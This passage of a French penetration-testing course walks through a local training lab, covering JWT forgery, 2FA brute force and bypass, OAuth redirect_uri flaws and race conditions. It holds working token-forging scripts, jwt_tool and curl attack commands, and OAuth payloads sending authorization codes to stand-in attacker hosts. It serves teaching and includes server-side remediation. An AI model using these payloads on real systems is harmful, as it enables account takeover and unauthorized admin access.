| `curl -X GET http://localhost:8080/admin/debug` | Requête GET vers le endpoint de débogage admin. Ce endpoint expose des informations internes (hôtes, flags). |
| `-b "token=PASTE_TOKEN"` | Envoie le JWT forgé avec injection `kid`. Remplacez `PASTE_TOKEN` par le token généré. |

#### Analyse du code vulnérable

```python
# Extrait de app.py — ligne 258-264
# Détection des patterns de path traversal dans le champ kid
# Si kid contient '../' (remonter dans l'arborescence) ou '/dev/' (périphériques)
if '../' in str(kid) or '/dev/' in str(kid):
    # Si kid contient aussi 'null', le serveur utilise une clé vide
    if 'null' in str(kid):
        return jwt.decode(token, '', algorithms=['HS256'])
    # Sinon, il désactive carrément la vérification de signature
    return jwt.decode(token, options={"verify_signature": False})
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `if '../' in str(kid) or '/dev/' in str(kid)` | Détecte les tentatives de path traversal. Normalement, ce code devrait **rejeter** ces requêtes. Au lieu de cela, il traite le cas spécial. |
| `jwt.decode(token, '', algorithms=['HS256'])` | Décode le JWT avec une **clé vide** `''`. Le token est accepté sans véritable vérification. |
| `jwt.decode(token, options={"verify_signature": False})` | Décode le JWT en **désactivant complètement** la vérification de signature. N'importe quel token modifié est accepté. |


### 2.5 Outils pour l'attaque JWT

#### 2.5.1 jwt.io (Site web)

**URL :** https://jwt.io

**Utilisation :**
1. Coller un JWT dans l'interface
2. Lecture automatique du header, payload, signature
3. Modification interactive du header/payload
4. Re-signature avec une clé de son choix

> **Limitation :** Ne permet pas de générer des attaques avancées (kid injection, HMAC/RSA confusion). Utiliser plutôt PyJWT ou jwt_tool.

#### 2.5.2 PyJWT (Bibliothèque Python)

**Installation :**

```bash
# Installation de la bibliothèque PyJWT via pip
# pyjwt : bibliothèque Python pour encoder, décoder et vérifier les JWT
# Supporte les algorithmes HS256, RS256, ES256, et les attaques (none, kid injection)
pip3 install pyjwt
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `pip3 install pyjwt` | Installe le paquet `pyjwt` (Python JWT). PyJWT permet de créer, signer, vérifier et decoder les JWT selon la RFC 7519. |

**Utilisation pour les attaques :**

```python
import jwt

# Token normal avec HS256 (HMAC-SHA256)
# "secret" est la clé symétrique partagée entre serveur et client légitime
payload = {"user_id": 2, "role": "user"}
token = jwt.encode(payload, "secret", algorithm="HS256")

# None algorithm — pas de signature
# algorithm="none" : le JWT n'est pas signé, le payload peut être modifié librement
# Cette attaque fonctionne si le serveur n'interdit pas l'algo 'none'
token_none = jwt.encode(payload, "", algorithm="none")

# HMAC/RSA confusion — utiliser la clé publique comme secret HMAC
# On lit la clé publique depuis un fichier (ex: public.pem récupéré du serveur)
# On la passe comme "secret" pour HS256 — confusion entre symétrique et asymétrique
public_key = open("public.pem").read()
token_confusion = jwt.encode(payload, public_key, algorithm="HS256")

# Kid injection — path traversal vers /dev/null pour clé vide
# headers={"kid": "/dev/null"} : le serveur lit /dev/null → clé vide
# On signe avec une chaîne vide ("") — la même que celle lue par le serveur
headers = {"kid": "/dev/null"}
token_kid = jwt.encode(payload, "", algorithm="HS256", headers=headers)
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `jwt.encode(payload, "secret", algorithm="HS256")` | Token légitime : signe le payload avec la clé secrète "secret" en HMAC-SHA256. |
| `jwt.encode(payload, "", algorithm="none")` | Attaque None Algorithm : pas de clé, pas de signature. Le payload est seulement encodé en Base64. |
| `open("public.pem").read()` | Lit la clé publique RSA depuis un fichier. Cette clé est censée être utilisée pour **vérifier** (pas signer) les tokens RS256. |
| `jwt.encode(payload, public_key, algorithm="HS256")` | Attaque HMAC/RSA Confusion : utilise la clé publique comme secret HMAC. Le serveur vérifie avec la même clé → signature valide. |
| `headers={"kid": "/dev/null"}` | Ajoute un champ `kid` dans l'en-tête. Le serveur lit `/dev/null` comme clé de vérification (contenu vide). |
| `jwt.encode(payload, "", algorithm="HS256", headers=headers)` | Attaque Kid Injection : signe avec une chaîne vide, le serveur lit `/dev/null` (vide) → signature correspond. |


#### 2.5.3 jwt_tool (Outil en ligne de commande)

**Installation :**

```bash
# Installation de jwt_tool depuis GitHub
# git clone : télécharge le dépôt officiel de l'outil
git clone https://github.com/ticarpi/jwt_tool.git
# cd jwt_tool : se déplace dans le répertoire de l'outil
cd jwt_tool
# Création d'un environnement virtuel Python (isole les dépendances)
python3 -m venv venv
# Activation de l'environnement virtuel
source venv/bin/activate
# Installation des dépendances listées dans requirements.txt
pip3 install -r requirements.txt
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `git clone https://github.com/ticarpi/jwt_tool.git` | Clone le dépôt GitHub de jwt_tool (outil de test et d'attaque JWT). |
| `cd jwt_tool` | Se place dans le répertoire de l'outil. |
| `python3 -m venv venv` | Crée un environnement virtuel Python nommé `venv`. Isole les dépendances du projet du système. |
| `source venv/bin/activate` | Active l'environnement virtuel. Les commandes `python3` et `pip3` utiliseront les modules installés dans `venv/`. |
| `pip3 install -r requirements.txt` | Installe toutes les dépendances Python listées dans `requirements.txt` (cryptographie, requests, etc.). |

**Utilisation :**

```bash
# Analyser un JWT — décode le header, payload, signature
# jwt_tool.py <token> : affiche les trois parties du JWT décodées
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyfQ.xxxx

# Tester l'algorithme "none" — forge un JWT avec alg:none
# -X a : utilise le module d'attaque "none algorithm"
# -I : mode interactif (modifie le payload)
# -pc role : sélectionne le champ "role" dans le payload
# -pv admin : définit la valeur "admin" pour le champ role
python3 jwt_tool.py TOKEN -X a -I -pc role -pv admin

# Tester le path traversal sur kid — injection kid
# -X k : utilise le module d'attaque "kid injection"
# -kc ../../../dev/null : définit la valeur de kid comme chemin relatif vers /dev/null
python3 jwt_tool.py TOKEN -X k -kc ../../../dev/null

# Scan complet des vulnérabilités JWT
# -T : teste tous les vecteurs d'attaque connus (none, confusion, kid, etc.)
python3 jwt_tool.py TOKEN -T
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `jwt_tool.py <token>` | Analyse le JWT : décode le header, payload, et vérifie la signature si une clé est fournie. |
| `-X a` | Sélectionne le module d'attaque "None Algorithm". |
| `-I` | Mode interactif : permet de modifier le payload avant génération. |
| `-pc role` | (payload claim) Sélectionne le champ `role` dans le payload JWT. |
| `-pv admin` | (payload value) Définit la valeur du champ sélectionné à `admin`. |
| `-X k` | Sélectionne le module d'attaque "Kid Injection". |
| `-kc ../../../dev/null` | (kid claim) Définit la valeur du champ `kid` à `../../../dev/null` (path traversal). |
| `-T` | (test) Exécute tous les tests de vulnérabilité disponibles sur le JWT. |


### 2.6 TP Guidé — Forger un JWT Admin

**Objectif :** Enchaîner les trois attaques JWT pour obtenir un token admin et accéder à l'endpoint `/admin/debug`.

**Étape 1 — Récupérer un JWT légitime**

```bash
# Connexion au lab pour obtenir un JWT légitime
# -c /tmp/jwt_cookies.txt : stockage des cookies dans un fichier dédié
# -X POST : méthode HTTP pour le login
# -d "email=...&password=..." : identifiants du compte user standard
# -L : suit les redirections
curl -c /tmp/jwt_cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" -L
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -c /tmp/jwt_cookies.txt` | Se connecte et sauvegarde le cookie JWT dans `/tmp/jwt_cookies.txt`. |
| `-d "email=...&password=..."` | Identifiants du compte standard `user@ecovault.com` fourni par le laboratoire. |
| `-L` | Suit les redirections HTTP après connexion. |

**Étape 2 — Analyser la configuration JWT**

```bash
# Récupération de la configuration JWT du serveur
# /api/jwt-info : endpoint exposant la clé publique et l'algorithme
# | jq . : pipe le résultat JSON dans jq pour le formater et le coloriser
# jq est un outil CLI de traitement JSON (comme sed pour JSON)
curl http://localhost:8080/api/jwt-info | jq .
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl http://localhost:8080/api/jwt-info` | Récupère la configuration JWT du serveur (clé publique, algorithme, note). |
| `\| jq .` | Pipe la sortie JSON vers `jq`, un parseur JSON en ligne de commande. Le `.` signifie "imprimer tout l'objet". Formate et colorise le JSON brut. |


**Étape 3 — Attaque par None Algorithm**

```python
#!/usr/bin/env python3
"""
jwt_admin_forge.py — Tentative des 3 attaques JWT pour obtenir un token admin.
Teste successivement les trois vecteurs d'attaque JWT.
"""
import jwt
import requests

# URL de base du laboratoire
BASE = "http://localhost:8080"

# Récupérer la clé publique RSA depuis l'API (pour l'attaque HMAC/RSA confusion)
pub = requests.get(f"{BASE}/api/jwt-info").json()["public_key"]

# Payload admin commun aux trois attaques
# On usurpe l'identité de l'administrateur (ID=1, rôle=admin)
admin_payload = {
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin"
}

print("="*60)
print("Attaque 1 — None Algorithm")
# Token sans signature : header {"alg":"none"}, payload admin, pas de signature
token1 = jwt.encode(admin_payload, "", algorithm="none")
print(f"Token: {token1}")
# Test du token contre l'endpoint admin
r1 = requests.get(f"{BASE}/admin/debug", cookies={"token": token1})
print(f"Status: {r1.status_code} — {r1.text[:100] if r1.ok else 'FAIL'}")
print()

print("="*60)
print("Attaque 2 — HMAC/RSA Confusion")
# Token signé avec HS256 en utilisant la clé PUBLIQUE comme secret
token2 = jwt.encode(admin_payload, pub, algorithm="HS256")
print(f"Token: {token2}")
r2 = requests.get(f"{BASE}/admin/debug", cookies={"token": token2})
print(f"Status: {r2.status_code} — {r2.text[:100] if r2.ok else 'FAIL'}")
print()

print("="*60)
print("Attaque 3 — Kid Injection (/dev/null)")
# Token avec kid pointant vers /dev/null, signé avec chaîne vide
token3 = jwt.encode(admin_payload, "", algorithm="HS256", headers={"kid": "/dev/null"})
print(f"Token: {token3}")
r3 = requests.get(f"{BASE}/admin/debug", cookies={"token": token3})
print(f"Status: {r3.status_code} — {r3.text[:100] if r3.ok else 'FAIL'}")
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `import jwt` | PyJWT : bibliothèque de manipulation JWT (encodage, décodage, signature). |
| `import requests` | Bibliothèque HTTP pour interagir avec l'API du laboratoire. |
| `pub = requests.get(...).json()["public_key"]` | Récupère la clé publique RSA depuis `/api/jwt-info` pour l'attaque HMAC/RSA confusion. |
| `jwt.encode(admin_payload, "", algorithm="none")` | Attaque 1 : encode le payload sans signature (algorithme `none`). |
| `jwt.encode(admin_payload, pub, algorithm="HS256")` | Attaque 2 : signe avec HS256 en utilisant la clé publique RSA comme secret HMAC. |
| `jwt.encode(admin_payload, "", algorithm="HS256", headers={"kid": "/dev/null"})` | Attaque 3 : signe avec une clé vide, le `kid` `/dev/null` fait que le serveur utilise aussi une clé vide. |
| `requests.get(..., cookies={"token": token})` | Teste chaque token forgé contre le endpoint `/admin/debug`. Le cookie `token` contient le JWT. |
| `r1.status_code` | Code HTTP de la réponse. `200 OK` = attaque réussie, `403` ou `401` = échec. |
| `r1.text[:100] if r1.ok else 'FAIL'` | Affiche les 100 premiers caractères de la réponse si succès, sinon 'FAIL'. |

```bash
# Exécution du script de forge JWT testant les 3 attaques
# Le script teste None Algorithm, HMAC/RSA Confusion, et Kid Injection
# Chaque token est testé contre /admin/debug
python3 jwt_admin_forge.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 jwt_admin_forge.py` | Lance le script qui tente les 3 attaques JWT. Pour chaque attaque, un token est forgé et testé. Le script affiche le statut HTTP et un extrait de la réponse. |


**Étape 4 — Vérifier l'accès admin**

```bash
# Test du token admin forgé contre le endpoint /admin/debug
# TOKEN="eyJ..." : remplacez par le JWT obtenu via l'attaque 2 (confusion) ou 3 (kid injection)
# -b "token=$TOKEN" : utilise la variable shell TOKEN comme valeur du cookie JWT
# | jq . : formate la réponse JSON pour une lecture facile
# La réponse attendue contient les hôtes internes et un flag
TOKEN="eyJ..."
curl -X GET http://localhost:8080/admin/debug \
  -b "token=$TOKEN" | jq .
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `TOKEN="eyJ..."` | Variable shell contenant le JWT forgé. L'assignation se fait sans `$` devant le nom. |
| `-b "token=$TOKEN"` | Référence la variable shell `$TOKEN` comme valeur du cookie `token`. Le shell remplace `$TOKEN` par sa valeur avant d'exécuter curl. |
| `\| jq .` | Formate la réponse JSON. `jq .` imprime l'objet JSON avec une mise en forme lisible (indentation, couleurs). |


Réponse attendue :

```json
{
    "internal_hosts": ["10.0.0.10:8081", "10.0.0.10:25"],
    "hint": "Le serveur SMTP interne contient des messages sensibles",
    "flag_4": "flag{ssti_rce_admin_2026}"
}
```

**Flag obtenu :** `flag{ssti_rce_admin_2026}`

---

## 3. 2FA Bypass & OAuth Flaws

**Tag MITRE ATT&CK :** T1078 (Valid Accounts) — Contournement de l'authentification multifacteur.

### 3.1 Force brute du code 2FA (absence de rate-limiting)

**Principe :** Le code 2FA est souvent un code à 4-6 chiffres. Sans limitation de tentatives, l'attaquant peut le bruteforcer en quelques secondes.

**Espace de recherche :**
- 4 chiffres → 10 000 combinaisons
- 6 chiffres → 1 000 000 combinaisons

À 100 requêtes/seconde, un code 4 chiffres est craqué en ~100 secondes.

**Détection :**

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Test de l'absence de rate-limiting sur l'endpoint de vérification 2FA
# Envoie 100 codes 2FA différents en séquence pour détecter une limitation de débit
# Si le serveur accepte toutes les requêtes sans retourner 429 (Too Many Requests),
# le rate-limiting est absent — vulnérabilité exploitable par bruteforce

# Boucle de 1 à 100 : séquence de codes 2FA
for i in $(seq 1 100); do
  # Requête POST vers l'endpoint de vérification 2FA
  # -d "code=$i" : envoie le code 2FA courant (de 1 à 100) comme paramètre
  # -w "%{http_code}\n" : affiche uniquement le code HTTP de réponse (200, 429, etc.)
  # -o /dev/null : ignore le corps de la réponse (ne pas encombrer la sortie)
  # -s : mode silencieux (n'affiche pas la barre de progression)
  curl -X POST http://localhost:8080/api/2fa/verify \
    -d "code=$i" \
    -w "%{http_code}\n" -o /dev/null -s
done | sort | uniq -c
# sort | uniq -c : trie les codes HTTP et compte les occurrences
# Exemple de sortie si rate-limiting absent :
#   100 200  (100 réponses 200 OK = pas de limitation)
# Exemple si rate-limiting présent :
#    95 200  (95 OK)
#     5 429  (5 rejets pour cause de trop nombreuses requêtes)
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `for i in $(seq 1 100)` | Boucle shell : itère sur les entiers de 1 à 100. Chaque itération teste un code 2FA différent. |
| `curl -X POST http://localhost:8080/api/2fa/verify` | Requête POST vers l'endpoint de vérification 2FA. |
| `-d "code=$i"` | Envoie le code 2FA courant. `$i` est remplacé par la valeur de l'itération (1, 2, 3...). |
| `-w "%{http_code}\n"` | (write-out) Affiche uniquement le code HTTP de la réponse (ex: 200, 400, 429). |
| `-o /dev/null` | Redirige le corps de la réponse vers `/dev/null` (le jeter). On ne garde que le code HTTP. |
| `-s` | (silent) Mode silencieux : supprime la barre de progression et les messages d'erreur. |
| `sort \| uniq -c` | Trie les codes HTTP et compte les occurrences de chaque code. Permet de voir la répartition des réponses. |


**Exploitation avec Burp Suite Intruder :**

1. Intercepter la requête POST `/api/2fa/verify`
2. Envoyer à Intruder (`Ctrl+I`)
3. Positionner la payload sur le paramètre `code`
4. Configurer : Payload type = `Numbers`, de `0000` à `9999`, step = `1`
5. Lancer l'attaque
6. Trier par `Length` — la réponse avec le code valide aura une taille différente

### 3.2 Response Manipulation

**Principe :** L'application peut renvoyer un flag JSON indiquant le succès ou l'échec de l'authentification 2FA dans la réponse. L'attaquant modifie cette réponse (avec un proxy comme Burp) pour contourner la vérification.

**Déroulement :**

```http
POST /api/2fa/verify HTTP/1.1
Content-Type: application/json

{"code": "1234"}
```

Réponse normale (échec) :

```json
{"success": false, "error": "Code invalide"}
```

**Attaque :** Intercepter la requête avec Burp, activer « Intercept Response », et modifier la réponse :

```json
{"success": true, "token": "admin-jwt-forged"}
```

> **Note :** Cette attaque fonctionne uniquement si la logique 2FA est gérée côté client (JavaScript), ce qui est une erreur de conception grave.

### 3.3 Direct Endpoint Access

**Principe :** L'application peut avoir une étape 2FA côté client **sans** vérification côté serveur. L'attaquant accède directement à l'endpoint protégé sans passer par la vérification 2FA.

```bash
# Attaque par accès direct à un endpoint protégé par 2FA
# Principe : l'application vérifie le 2FA côté client mais PAS côté serveur
# On saute l'étape de vérification 2FA et on accède directement à la ressource

# Au lieu du flux normal :
# POST /api/2fa/verify → redirect → GET /dashboard

# L'attaquant contourne la vérification 2FA en accédant directement :
# Le serveur ne vérifie PAS si l'utilisateur a complété le 2FA dans sa session
# Si le flag '2fa_verified' n'est pas contrôlé côté serveur, l'accès est accordé
curl http://localhost:8080/dashboard \
  -b "session=TOKEN_SANS_2FA"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl http://localhost:8080/dashboard` | Requête GET vers le dashboard sans passer par l'étape de vérification 2FA. |
| `-b "session=TOKEN_SANS_2FA"` | Envoie un cookie de session qui n'a PAS subi la vérification 2FA. Si le serveur accepte la requête, c'est que le contrôle 2FA est côté client uniquement. |


Si le serveur ne vérifie pas que le flag `2fa_verified` est présent dans la session, l'accès est accordé.

### 3.4 OAuth 2.0 Flaws

#### 3.4.1 Redirect URI non validé

**Principe :** Le paramètre `redirect_uri` n'est pas vérifié côté serveur. L'attaquant redirige le code d'autorisation vers son propre serveur.

```http
GET /oauth/authorize?client_id=app_client&redirect_uri=https://attaquant.com/callback&response_type=code&scope=openid+profile
```

**Exploitation :**

```bash
# Exploitation d'OAuth par redirect_uri non validé
# 1. L'attaquant envoie un lien à la victime avec un redirect_uri malveillant
# 2. La victime clique et s'authentifie légitimement
# 3. Le code d'autorisation est envoyé au serveur de l'attaquant (au lieu du serveur légitime)
# 4. L'attaquant échange le code d'autorisation intercepté contre un token d'accès

# Échange du code d'autorisation intercepté contre un token
# grant_type=authorization_code : indique qu'on échange un code contre un token
# code=AUTH_CODE : le code d'autorisation intercepté
# redirect_uri=https://attaquant.com/callback : l'URI où le code a été reçu (doit correspondre)
# client_id=app_client : identifiant de l'application OAuth
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://attaquant.com/callback&client_id=app_client"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `-d "grant_type=authorization_code"` | Type d'octroi OAuth 2.0. Indique qu'on échange un code d'autorisation contre un token. |
| `code=AUTH_CODE` | Le code d'autorisation à usage unique intercepté par l'attaquant. |
| `redirect_uri=https://attaquant.com/callback` | L'URI de redirection où le code a été envoyé. Doit correspondre à celle utilisée lors de la demande d'autorisation. |
| `client_id=app_client` | Identifiant de l'application OAuth enregistrée. |

**Détection :**

```bash
# Test de validation du paramètre redirect_uri
# On envoie différentes URI malveillantes pour voir si le serveur les accepte
# Si l'une d'elles fonctionne, le serveur ne valide pas le redirect_uri

# Test 1 : domaine externe malveillant
curl "http://localhost:8080/oauth/authorize?client_id=app_client&redirect_uri=https://evil.com/callback&response_type=code"

# Test 2 : protocole file (lecture de fichiers système)
# Tente d'utiliser un chemin de fichier local comme redirect_uri
curl "http://localhost:8080/oauth/authorize?client_id=app_client&redirect_uri=file:///etc/passwd&response_type=code"

# Test 3 : injection JavaScript (XSS potentiel)
# Tente un protocole javascript: pour exécuter du code dans le navigateur
curl "http://localhost:8080/oauth/authorize?client_id=app_client&redirect_uri=javascript:alert(1)&response_type=code"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `redirect_uri=https://evil.com/callback` | Teste un redirect_uri vers un domaine externe non autorisé. |
| `redirect_uri=file:///etc/passwd` | Teste un redirect_uri avec le protocole `file:` pour tenter de lire des fichiers système. |
| `redirect_uri=javascript:alert(1)` | Teste un redirect_uri avec le protocole `javascript:` pour détecter une vulnérabilité XSS. |
| `response_type=code` | Paramètre OAuth : demande un code d'autorisation (Authorization Code Flow). |


#### 3.4.2 CSRF sur Init OAuth

**Principe :** L'initiation du flux OAuth n'est pas protégée par un token anti-CSRF. L'attaquant force la victime à linker son compte à l'application attaquante.

```html
<!-- L'attaquant héberge cette page -->
<img src="http://localhost:8080/oauth/authorize?client_id=evil_app&redirect_uri=https://evil.com/callback&response_type=code&state=ATTACKER_STATE" style="display:none">
```

**Conséquence :** Le compte de la victime est lié à l'application malveillante, donnant accès à ses données.

#### 3.4.3 Scope Upgrade / Scope Squatting

**Principe :** L'attaquant obtient un token avec un scope limité (ex. `email`), mais le modifie pour obtenir un scope plus large (ex. `admin`).

```http
POST /oauth/token HTTP/1.1
Content-Type: application/json

{
    "grant_type": "authorization_code",
    "code": "AUTH_CODE",
    "scope": "openid email admin"  ← scope ajouté !
}
```

Si le serveur ne vérifie pas que le scope demandé correspond au scope accordé initialement, l'attaque réussit.

#### 3.4.4 Replay du Code d'Autorisation

**Principe :** Le code d'autorisation n'est pas marqué comme `one-time use`. L'attaquant l'intercepte et l'utilise plusieurs fois.

```bash
# Test de rejeu du code d'autorisation OAuth
# Un code d'autorisation doit être à usage unique (one-time use)
# Si le code peut être utilisé plusieurs fois, c'est une vulnérabilité

# Première utilisation (valide — devrait retourner un token)
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code&code=VALID_CODE&client_id=app_client&redirect_uri=https://app.com/callback"

# Deuxième utilisation (NE DEVRAIT PAS fonctionner)
# Si cette requête retourne aussi un token, le code est réutilisable
# Mêmes paramètres que la première requête
# Le serveur devrait avoir marqué le code comme utilisé après la première requête
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code&code=VALID_CODE&client_id=app_client&redirect_uri=https://app.com/callback"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `grant_type=authorization_code` | Type d'octroi pour l'échange code → token. |
| `code=VALID_CODE` | Le code d'autorisation à tester. Même code utilisé dans les deux requêtes. |
| Première requête | Devrait retourner un token d'accès (le code est valide). |
| Deuxième requête | **Test de vulnérabilité** : si le code est à usage unique, le serveur retourne une erreur. Si la deuxième requête réussit aussi, le code est réutilisable. |


**Détection :** Intercepter un code d'autorisation et le soumettre deux fois. Si la deuxième requête retourne un token valide, le code est réutilisable.

### 3.5 TP Guidé — Contournement 2FA

**Objectif :** Contourner la vérification 2FA sur le lab.

**Note :** Le lab EcoVault ne dispose pas d'un endpoint 2FA dédié. Cet exercice simule un contournement en accédant directement aux ressources protégées après avoir forgé un JWT admin (voir section 2).

**Étape 1 — Forger un JWT admin**

```bash
# Forge d'un token admin avec jwt_tool (None Algorithm)
# -X a : attaque "none algorithm"
# -I : mode interactif (permet de modifier le payload)
# -pc role : sélectionne le claim "role" dans le payload
# -pv admin : définit la valeur "admin" pour le claim role
# -b "token=$(...)" : utilise le JWT actuel comme base de l'attaque
# La substitution $(...) exécute une commande pour récupérer le token :
#   - curl -s : connexion silencieuse
#   - -c - : écrit les cookies sur stdout (au lieu d'un fichier)
#   - grep token : filtre la ligne contenant le JWT
#   - awk '{print $NF}' : extrait la dernière colonne (valeur du JWT)
python3 jwt_tool.py -X a -I -pc role -pv admin \
  -b "token=$(curl -s -c - -X POST http://localhost:8080/login -d 'email=user@ecovault.com&password=User2026!' | grep token | awk '{print $NF}')"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `-X a` | (eXploit) Sélectionne l'attaque "None Algorithm" dans jwt_tool. |
| `-I` | (Interactive) Mode interactif : jwt_tool ouvre un éditeur pour modifier le payload avant signature. |
| `-pc role` | (payload claim) Indique le claim à modifier dans le payload (ici `role`). |
| `-pv admin` | (payload value) Définit la valeur du claim modifié à `admin`. |
| `-b "token=$(...)"` | (bearer/before) Fournit le JWT original comme base de l'attaque. La substitution de commande `$(...)` exécute un curl pour obtenir le JWT. |
| `curl -s -c -` | (silent, cookie-jar to stdout) Se connecte et écrit les cookies sur la sortie standard. |
| `grep token` | Filtre la ligne contenant le mot "token" (nom du cookie JWT). |
| `awk '{print $NF}'` | Extrait la dernière colonne (`$NF` = Number of Fields) de la ligne — c'est la valeur du JWT. |


**Étape 2 — Simuler un contournement 2FA**

```bash
# Simulation d'un contournement 2FA — accès direct à une ressource admin
# On utilise un JWT admin forgé pour accéder directement à /admin/templates
# SANS passer par l'étape de vérification 2FA

# REMPLACER par le token JWT réel obtenu via l'étape de connexion précédente
TOKEN_ADMIN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE"

# Requête GET vers /admin/templates avec le token admin
# Si l'application n'a pas de vérification 2FA côté serveur, l'accès est accordé
curl -X GET http://localhost:8080/admin/templates \
  -b "token=$TOKEN_ADMIN"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `TOKEN_ADMIN="..."` | Variable shell contenant le JWT administrateur forgé. |
| `curl -X GET http://localhost:8080/admin/templates` | Requête GET vers le endpoint admin. Normalement, ce endpoint devrait exiger une vérification 2FA supplémentaire. |
| `-b "token=$TOKEN_ADMIN"` | Transmet le JWT admin comme cookie. Si le serveur ne vérifie pas le flag `2fa_verified`, l'accès est accordé sans 2FA. |


**Étape 3 — Vérifier l'accès sans restriction 2FA**

```bash
# Vérification de l'absence de restriction 2FA
# L'application ne requiert PAS de vérification 2FA supplémentaire
# → Vulnérabilité : Single Factor Authentication uniquement
# Le endpoint /api/whoami renvoie les informations de l'utilisateur connecté
# Si la réponse montre le rôle admin sans avoir passé le 2FA, la vérification 2FA est absente
# -s : mode silencieux (pas de barre de progression)
# | jq . : formatage JSON de la réponse
curl -s -b "token=$TOKEN_ADMIN" http://localhost:8080/api/whoami | jq .
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -s` | Mode silencieux : supprime les messages de progression et d'erreur. |
| `-b "token=$TOKEN_ADMIN"` | Envoie le JWT admin forgé comme cookie. |
| `/api/whoami` | Endpoint qui renvoie les informations de l'utilisateur authentifié (ID, email, rôle). |
| `\| jq .` | Formate la réponse JSON pour la rendre lisible. |


Réponse :

```json
{
    "user_id": 1,
    "email": "admin@ecovault.com",
    "role": "admin",
    "kid": "key1"
}
```

**Étape 4 — Recommandations NIS2**

Conformément à l'**Article 21** de NIS2, l'authentification multifacteur (MFA) doit être implémentée pour :

- Tout accès à des interfaces d'administration
- Tout accès à distance
- Tout accès à des données sensibles

**Remédiation côté serveur (exemple Flask) :**

```python
# À implémenter dans app.py — remédiation NIS2 Art. 21
# Vérification stricte de l'authentification multifacteur côté serveur

@app.route('/admin/templates')
def admin_templates():
    # Récupération du token JWT depuis le cookie de la requête
    token = request.cookies.get('token')
    # Décodage et vérification du JWT (extraction des claims)
    user = decode_jwt(token)
    # Vérification 1 : l'utilisateur est-il authentifié ET est-il admin ?
    if not user or user.get('role') != 'admin':
        return jsonify({'error': 'Non autorisé'}), 403
    # Vérification 2 : l'utilisateur a-t-il complété le 2FA ?
    if not user.get('2fa_verified'):
        # Redirection vers la page de vérification 2FA
        return redirect(url_for('verify_2fa'))
    # Suite du traitement — accès autorisé
```

**Explication du code de remédiation :**
| Élément | Rôle/Explication |
|------|------|
| `request.cookies.get('token')` | Récupère la valeur du cookie `token` depuis la requête HTTP entrante. |
| `decode_jwt(token)` | Décode et vérifie la signature du JWT. Retourne le payload (claims) si valide, `None` sinon. |
| `if not user or user.get('role') != 'admin'` | Vérifie que l'utilisateur est authentifié ET possède le rôle `admin`. Sans cette vérification, un utilisateur simple pourrait accéder aux pages admin (IDOR/privilege escalation). |
| `if not user.get('2fa_verified')` | **Vérification 2FA côté serveur** : contrôle que l'utilisateur a complété l'authentification multifacteur pendant sa session. |
| `return redirect(url_for('verify_2fa'))` | Redirige vers la page de vérification 2FA si non complétée. Conformité avec l'Article 21 de NIS2. |


---

## 4. Race Conditions & TOCTOU

**Tag MITRE ATT&CK :** T1068 — Exploitation for Privilege Escalation

### 4.1 Time-of-Check Time-of-Use (TOCTOU)

**Principe :** La vulnérabilité TOCTOU survient lorsqu'il y a un délai entre la **vérification** d'une condition (Time-of-Check) et l'**utilisation** du résultat (Time-of-Use). Pendant ce délai, l'état du système peut changer.

```
Time-of-Check (TOC) : Vérifier que le coupon n'a pas été utilisé
         │
         │   ← DÉLAI (vulnérable aux interférences)
         │
Time-of-Use (TOU)  : Marquer le coupon comme utilisé
```

Si l'attaquant envoie **plusieurs requêtes simultanément** pendant ce délai, toutes les vérifications passent avant qu'aucune n'ait marqué le coupon comme utilisé.

**Diagramme de l'attaque :**

```
Requête 1 ──→ TOC (coupon valide ✅) ──→ ... délai ... ──→ TOU (marquer utilisé)
Requête 2 ──→ TOC (coupon valide ✅) ──→ ... délai ... ──→ TOU (marquer utilisé)
Requête 3 ──→ TOC (coupon valide ✅) ──→ ... délai ... ──→ TOU (marquer utilisé)
```

Les trois requêtes passent le TOC avant qu'aucune n'ait atteint le TOU.

### 4.2 Turbo Intruder — Installation et Script d'Attaque

**Turbo Intruder** est une extension Burp Suite pour les attaques de race condition. Elle envoie des centaines de requêtes en parallèle.

**Installation :**

1. Ouvrir Burp Suite
2. Aller dans `Extender` → `BApp Store`
3. Rechercher `Turbo Intruder`
4. Cliquer sur `Install`

**Alternative (autonome) :**

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Installation de Turbo Intruder version Python standalone
# Turbo Intruder est un outil d'attaque par race condition
# Il envoie des centaines de requêtes HTTP en parallèle (multithreading)
# La version pip est utilisable en ligne de commande sans Burp Suite
pip3 install turbointruder
```

**Explication des commandes :**
